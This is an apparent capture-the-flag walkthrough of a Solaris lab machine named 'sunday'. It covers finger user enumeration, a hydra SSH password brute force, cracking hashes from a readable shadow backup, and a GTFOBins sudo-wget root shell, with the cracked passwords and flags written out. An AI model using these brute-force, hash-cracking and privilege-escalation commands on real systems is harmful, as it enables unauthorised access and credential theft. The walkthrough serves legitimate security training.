
Target : 10.129.26.106

Started off with the port scan : 79, 111, 515, 6787

![](../Screenshot%202026-07-03%20at%2010.48.01%20PM.png)

Enumerating Web: 6787

```
/.htpasswd            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 3889]
/jhtml                (Status: 403) [Size: 199]
/login                (Status: 302) [Size: 225] [--> https://10.129.26.106:6787/solaris/login/]
/phtml                (Status: 403) [Size: 199]
/rhtml                (Status: 403) [Size: 199]
/shtml                (Status: 403) [Size: 199]
/xhtml                (Status: 403) [Size: 199]
/~httpd               (Status: 403) [Size: 199]
/~http                (Status: 403) [Size: 199]
```

but for login, we know the username, but not the password

Enumerating port : 79

`finger-user-enum.pl ~/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip -p 79`

got user -> sammy, sunny

`hydra -l sunny -P ~/SecLists/rockyou.txt -s 22022 ssh://$ip  `

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-03 23:20:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ssh://10.129.26.106:22022/
[STATUS] 1146.00 tries/min, 1146 tries in 00:01h, 14343257 to do in 208:36h, 15 active
[22022][ssh] host: 10.129.26.106  **login: sunny   password: sunday**
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-03 23:22:25

sunny : sunday

**ssh into sunny**

`ssh sunny@$ip -p 22022`

and saw .bash_history has some data in it 

![](../Screenshot%202026-07-03%20at%2011.30.28%20PM.png)

cat /backup/shadow.backup (got my attention)

when i'm reading it, found password hash

```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

let's see whether `sammy` password is crackable or not using either john or hashcat

`john hash ~/SecLists/rockyou.txt`  (or)

`hashcat -m 7400 -a 0 hash ~/SecLists/rockyou.txt`

`sammy : cooldude!`

sammy@sunday:/home/sammy$ cat user.txt
9fae1f13a5812fcd2c2a4da2950e56b8

Root Escalation :

sudo -l   (it confirms that, we can run wget as root)

![](../Screenshot%202026-07-04%20at%2012.06.19%20AM.png)

Exploitation from gtfobins: 

```
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/root
chmod +x /tmp/root
sudo /usr/bin/wget --use-askpass=/tmp/root 0

```

root@sunday:~# cat root.txt
d5b92426ea8464d848cd9226af73d6f2

![](../Screenshot%202026-07-04%20at%2012.05.22%20AM.png)
